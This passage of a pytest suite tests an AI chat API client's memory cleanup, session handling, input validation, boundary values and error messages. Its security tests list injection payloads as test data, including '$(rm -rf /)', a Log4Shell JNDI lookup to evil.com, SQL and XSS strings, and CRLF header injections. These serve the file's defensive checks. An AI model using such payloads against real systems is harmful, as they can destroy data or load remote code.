            initial_objects = len(gc.get_objects())
            
            # Process large request
            result = await client.create_chat_completion(
                messages=[ChatMessage(role="user", content=large_message)],
                model_config=ModelConfig(name="test-model", max_tokens=300000)
            )
            
            # Clear references
            del large_message
            del result
            
            # Force garbage collection
            gc.collect()
            
            # Check that memory usage didn't grow excessively
            final_objects = len(gc.get_objects())
            object_growth = final_objects - initial_objects
            
            # Allow some growth but not excessive (adjust threshold as needed)
            assert object_growth < 1000  # Should not create thousands of new objects
    
    @pytest.mark.asyncio
    async def test_session_cleanup_on_client_deletion(self, mock_config):
        """Test that sessions are properly cleaned up when client is deleted."""
        # Create client
        client = GenesisAPIClient(**mock_config)
        session = client.session
        
        # Verify session exists
        assert session is not None
        assert not session.closed
        
        # Delete client
        await client.close()
        del client
        
        # Session should be closed
        assert session.closed
    
    @pytest.mark.asyncio
    async def test_multiple_context_manager_usage(self, mock_config):
        """Test multiple context manager usage patterns."""
        sessions = []
        
        # Test nested context managers
        async with GenesisAPIClient(**mock_config) as client1:
            sessions.append(client1.session)
            
            async with GenesisAPIClient(**mock_config) as client2:
                sessions.append(client2.session)
                
                # Both sessions should be active
                assert not client1.session.closed
                assert not client2.session.closed
                assert client1.session is not client2.session
            
            # client2 session should be closed, client1 still active
            assert sessions[1].closed
            assert not sessions[0].closed
        
        # Both sessions should be closed
        assert all(session.closed for session in sessions)


class TestSecurityAndValidation:
    """Security-focused tests and input validation."""
    
    def test_api_key_sanitization_in_errors(self, client):
        """Test that API keys are not exposed in error messages."""
        # This is a hypothetical test - would need to check actual error handling
        try:
            # Force an error that might expose the API key
            client._build_headers({'Authorization': 'Bearer exposed-key'})
            headers = client._build_headers()
            
            # API key should not be in string representation
            header_str = str(headers)
            assert client.api_key not in header_str or 'Bearer' in header_str
        except Exception as e:
            # Ensure API key is not in exception message
            assert client.api_key not in str(e)
    
    def test_input_sanitization_for_injection_attempts(self, client):
        """Test input sanitization against potential injection attempts."""
        # Test various injection attempt patterns
        injection_attempts = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "$(rm -rf /)",
            "{{constructor.constructor('return process')().exit()}}",
            "${jndi:ldap://evil.com/x}",
            "\\u0000\\u0001\\u0002",  # Null bytes
        ]
        
        for injection in injection_attempts:
            try:
                messages = [ChatMessage(role="user", content=injection)]
                client._validate_messages(messages)
                
                # If validation passes, ensure content is properly escaped/sanitized
                # This would depend on the actual implementation
                assert injection in messages[0].content  # Content should be preserved
            except ValidationError:
                # It's acceptable to reject suspicious input
                pass
    
    def test_header_injection_prevention(self, client):
        """Test prevention of header injection attacks."""
        malicious_headers = {
            'X-Forwarded-For': '127.0.0.1\r\nX-Injected-Header: malicious',
            'User-Agent': 'Mozilla/5.0\r\nHost: evil.com',
            'Content-Type': 'application/json\r\n\r\nHTTP/1.1 200 OK'
        }
        
        # Should not allow header injection
        headers = client._build_headers(malicious_headers)
        
        # Verify that injected headers are not present
        for key, value in headers.items():
            assert '\r' not in key
            assert '\n' not in key
            assert '\r' not in str(value)
            assert '\n' not in str(value)
    
    def test_url_validation_and_sanitization(self, client):
        """Test URL validation and sanitization."""
        # Test that base URL is properly validated
        assert client.base_url.startswith('http')
        
        # Test that URL doesn't contain obvious injection attempts
        assert '\r' not in client.base_url
        assert '\n' not in client.base_url
        assert ' ' not in client.base_url


class TestDataIntegrityAndConsistency:
    """Tests for data integrity and consistency across operations."""
    
    @pytest.mark.asyncio
    async def test_message_ordering_preservation(self, client):
        """Test that message ordering is preserved throughout the request."""
        # Create a conversation with specific ordering
        ordered_messages = [
            ChatMessage(role="system", content="You are a helpful assistant."),
            ChatMessage(role="user", content="First user message"),
            ChatMessage(role="assistant", content="First assistant response"),
            ChatMessage(role="user", content="Second user message"),
            ChatMessage(role="assistant", content="Second assistant response"),
            ChatMessage(role="user", content="Third user message"),
        ]
        
        mock_response = {
            'id': 'order-test',
            'choices': [{'message': {'content': 'Final response'}}],
            'usage': {'total_tokens': 50}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Capture the actual request payload
            actual_request_data = None
            
            async def capture_request(*args, **kwargs):
                nonlocal actual_request_data
                if 'json' in kwargs:
                    actual_request_data = kwargs['json']
                elif len(args) > 1:
                    actual_request_data = args[1]
                
                mock_response_obj = Mock()
                mock_response_obj.status = 200
                mock_response_obj.json = AsyncMock(return_value=mock_response)
                return mock_response_obj
            
            mock_post.side_effect = capture_request
            
            await client.create_chat_completion(
                messages=ordered_messages,
                model_config=ModelConfig(name="test-model")
            )
            
            # Verify message ordering is preserved in request
            if actual_request_data and 'messages' in actual_request_data:
                sent_messages = actual_request_data['messages']
                assert len(sent_messages) == len(ordered_messages)
                
                for i, (sent, original) in enumerate(zip(sent_messages, ordered_messages)):
                    assert sent.get('role') == original.role
                    assert sent.get('content') == original.content
    
    def test_model_config_parameter_consistency(self, client):
        """Test that model configuration parameters maintain consistency."""
        # Test that parameters are preserved and consistent
        config = ModelConfig(
            name="consistency-test",
            max_tokens=1234,
            temperature=0.789,
            top_p=0.456,
            frequency_penalty=0.123,
            presence_penalty=0.987
        )
        
        # Validate the configuration
        client._validate_model_config(config)
        
        # Verify all parameters are exactly as set
        assert config.name == "consistency-test"
        assert config.max_tokens == 1234
        assert config.temperature == 0.789
        assert config.top_p == 0.456
        assert config.frequency_penalty == 0.123
        assert config.presence_penalty == 0.987
    
    def test_timestamp_consistency_across_operations(self):
        """Test timestamp consistency and format across different operations."""
        from app.ai_backend.genesis_api import format_timestamp
        
        # Test with multiple timestamps
        timestamps = [0, 1677610602, 1234567890, 9999999999]
        
        formatted_timestamps = [format_timestamp(ts) for ts in timestamps]
        
        # All should be strings
        assert all(isinstance(ft, str) for ft in formatted_timestamps)
        
        # All should be non-empty
        assert all(len(ft) > 0 for ft in formatted_timestamps)
        
        # Should be consistent for the same input
        for ts in timestamps:
            assert format_timestamp(ts) == format_timestamp(ts)


class TestBoundaryConditionsAndLimits:
    """Tests for boundary conditions and system limits."""
    
    def test_maximum_conversation_length(self, client):
        """Test behavior with maximum conversation length."""
        # Create a very long conversation
        max_messages = 1000
        long_conversation = []
        
        for i in range(max_messages):
            long_conversation.append(
                ChatMessage(role="user" if i % 2 == 0 else "assistant", 
                          content=f"Message {i}")
            )
        
        # Should handle validation of long conversations
        try:
            client._validate_messages(long_conversation)
        except ValidationError as e:
            # If there's a limit, it should be clearly indicated
            assert "too many" in str(e).lower() or "limit" in str(e).lower()
    
    def test_token_count_boundary_conditions(self):
        """Test token counting with boundary conditions."""
        from app.ai_backend.genesis_api import estimate_tokens
        
        # Test various boundary conditions
        test_cases = [
            ("", 0),  # Empty string
            (" ", 1),  # Single space
            ("a", 1),  # Single character
            ("a b", 2),  # Simple words
            ("a" * 1000, 1000),  # Long repetition
            ("word1 word2 word3", 3),  # Multiple words
            ("123", 1),  # Numbers
            ("!@#$%", 1),  # Special characters
        ]
        
        for content, expected_min in test_cases:
            tokens = estimate_tokens(content)
            assert tokens >= expected_min
            assert isinstance(tokens, int)
            assert tokens >= 0
    
    def test_model_parameter_boundary_values(self, client):
        """Test model parameters at their boundary values."""
        config = ModelConfig(name="boundary-test")
        
        # Test exact boundary values
        boundary_tests = [
            ('temperature', 0.0, True),
            ('temperature', 2.0, True),
            ('temperature', -0.001, False),
            ('temperature', 2.001, False),
            ('top_p', 0.0, True),
            ('top_p', 1.0, True),
            ('top_p', -0.001, False),
            ('top_p', 1.001, False),
            ('max_tokens', 1, True),
            ('max_tokens', 0, False),
            ('max_tokens', -1, False),
        ]
        
        for param, value, should_be_valid in boundary_tests:
            setattr(config, param, value)
            
            if should_be_valid:
                client._validate_model_config(config)
            else:
                with pytest.raises(ValidationError):
                    client._validate_model_config(config)
    
    @pytest.mark.asyncio
    async def test_response_size_limits(self, client):
        """Test handling of very large API responses."""
        # Simulate a very large response
        large_content = "x" * 10000000  # 10MB of content
        
        mock_response = {
            'id': 'large-response',
            'choices': [{'message': {'content': large_content}}],
            'usage': {'total_tokens': 2500000}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Should handle large responses without crashing
            result = await client.create_chat_completion(
                messages=[ChatMessage(role="user", content="Generate large text")],
                model_config=ModelConfig(name="test-model")
            )
            
            assert len(result.choices[0].message.content) == 10000000
            assert result.usage.total_tokens == 2500000


class TestErrorMessageQuality:
    """Tests for error message quality and user experience."""
    
    def test_validation_error_messages_are_descriptive(self, client):
        """Test that validation error messages are clear and helpful."""
        # Test various validation errors
        test_cases = [
            ([], "empty"),
            ([ChatMessage(role="invalid", content="test")], "role"),
            ([ChatMessage(role="user", content="")], "content"),
            ([ChatMessage(role="user", content="x" * 100000)], "long"),
        ]
        
        for invalid_messages, expected_keyword in test_cases:
            try:
                client._validate_messages(invalid_messages)
                assert False, f"Should have raised ValidationError for {expected_keyword}"
            except ValidationError as e:
                error_msg = str(e).lower()
                assert expected_keyword in error_msg
                # Error message should be helpful
                assert len(error_msg) > 10  # Should be more than just a code
    
    def test_model_config_error_messages_include_valid_ranges(self, client):
        """Test that model config error messages include valid ranges."""
        config = ModelConfig(name="test-model")
        
        # Test temperature out of range
        config.temperature = 3.0
        try:
            client._validate_model_config(config)
            assert False, "Should have raised ValidationError"
        except ValidationError as e:
            error_msg = str(e).lower()
            assert "temperature" in error_msg
            assert "0" in error_msg and "2" in error_msg  # Should mention valid range
        
        # Test top_p out of range
        config.temperature = 1.0  # Reset to valid
        config.top_p = 2.0
        try:
            client._validate_model_config(config)
            assert False, "Should have raised ValidationError"
        except ValidationError as e:
            error_msg = str(e).lower()
            assert "top_p" in error_msg
            assert "0" in error_msg and "1" in error_msg  # Should mention valid range
    
    @pytest.mark.asyncio
    async def test_network_error_messages_are_actionable(self, client, sample_messages, sample_model_config):
        """Test that network error messages provide actionable information."""
        # Test timeout error
        with patch('aiohttp.ClientSession.post', side_effect=asyncio.TimeoutError()):
            try:
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                assert False, "Should have raised GenesisAPIError"
            except GenesisAPIError as e:
                error_msg = str(e).lower()
                assert "timeout" in error_msg
                # Should provide actionable advice
                assert any(word in error_msg for word in ["retry", "try", "again", "later"])
        
        # Test connection error
        import aiohttp
        with patch('aiohttp.ClientSession.post', side_effect=aiohttp.ClientConnectionError()):
            try:
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                assert False, "Should have raised GenesisAPIError"
            except GenesisAPIError as e:
                error_msg = str(e).lower()
                assert "connection" in error_msg


# Run additional tests if this file is executed directly
if __name__ == "__main__":
    pytest.main([
        __file__,
        "-v",
        "--tb=short",
        "-k", "TestDeepValidation or TestAdvancedErrorRecovery or TestConcurrencyAndThreadSafety or TestStreamingAdvancedScenarios or TestMemoryAndResourceManagement or TestSecurityAndValidation or TestDataIntegrityAndConsistency or TestBoundaryConditionsAndLimits or TestErrorMessageQuality",
        "--maxfail=3"
    ])